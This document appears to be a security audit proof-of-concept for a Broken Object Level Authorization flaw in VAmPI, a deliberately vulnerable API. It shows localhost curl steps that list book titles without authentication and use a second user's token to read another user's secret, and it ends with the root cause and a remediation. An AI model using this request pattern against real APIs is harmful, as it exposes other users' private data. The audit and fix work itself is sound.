# PoC: H1 — Broken Object Level Authorization (BOLA), Book Access

- **ID**: H1
- **Severity**: High
- **PoC-Status**: theoretical
- **File**: api_views/books.py:50-51

## Vulnerability

`get_by_title` queries books by title only, with no ownership check:

```python
book = Book.query.filter_by(book_title=str(book_title)).first()
```

Any authenticated user who knows (or guesses) a book title retrieves its `secret_content` and `owner`, regardless of who created it.

## Prerequisites

- VAmPI running with default `vuln=1` (the default)
- Two registered users: `userA` (victim, owns the book) and `userB` (attacker)
- The victim's book title is known or enumerated via `GET /books/v1` (returns all titles unauthenticated)

## Step-by-Step

### 1. Register both users

```bash
# Register victim
curl -s -X POST http://localhost:5000/users/v1/register \
  -H 'Content-Type: application/json' \
  -d '{"username":"userA","password":"passA123","email":"a@x.com"}'

# Register attacker
curl -s -X POST http://localhost:5000/users/v1/register \
  -H 'Content-Type: application/json' \
  -d '{"username":"userB","password":"passB123","email":"b@x.com"}'
```

### 2. Victim adds a book with a secret

```bash
TOKEN_A=$(curl -s -X POST http://localhost:5000/users/v1/login \
  -H 'Content-Type: application/json' \
  -d '{"username":"userA","password":"passA123"}' | python3 -c "import sys,json; print(json.load(sys.stdin)['auth_token'])")

curl -s -X POST http://localhost:5000/books/v1 \
  -H "Authorization: $TOKEN_A" \
  -H 'Content-Type: application/json' \
  -d '{"book_title":"Secret Diary","secret":"my_top_secret_value"}'
```

### 3. Attacker enumerates book titles (no auth required)

```bash
curl -s http://localhost:5000/books/v1
# Response lists all book titles including "Secret Diary"
```

### 4. Attacker reads victim's book secret (BOLA exploit)

```bash
TOKEN_B=$(curl -s -X POST http://localhost:5000/users/v1/login \
  -H 'Content-Type: application/json' \
  -d '{"username":"userB","password":"passB123"}' | python3 -c "import sys,json; print(json.load(sys.stdin)['auth_token'])")

curl -s -X GET "http://localhost:5000/books/v1/Secret%20Diary" \
  -H "Authorization: $TOKEN_B"
```

### Expected Response

```json
{
  "book_title": "Secret Diary",
  "secret": "my_top_secret_value",
  "owner": "userA"
}
```

`userB` receives `userA`'s `secret_content` in full. The server never checks that the requesting user owns the requested book.

## Root Cause

`api_views/books.py` line 51 — the vulnerable branch runs `Book.query.filter_by(book_title=...)` with no `user_id` constraint. The fixed branch (lines 62-63, `vuln=0`) adds `filter_by(user=user, ...)` which scopes the lookup to the authenticated user.

## Impact

Horizontal privilege escalation: any authenticated user can read every other user's book secrets. Combined with the unauthenticated book-listing endpoint, an attacker can harvest all secrets with a single enumeration pass.

## Remediation

Remove the `if vuln` branch and enforce the owner filter unconditionally:

```python
user = User.query.filter_by(username=resp['sub']).first()
book = Book.query.filter_by(user=user, book_title=str(book_title)).first()
```
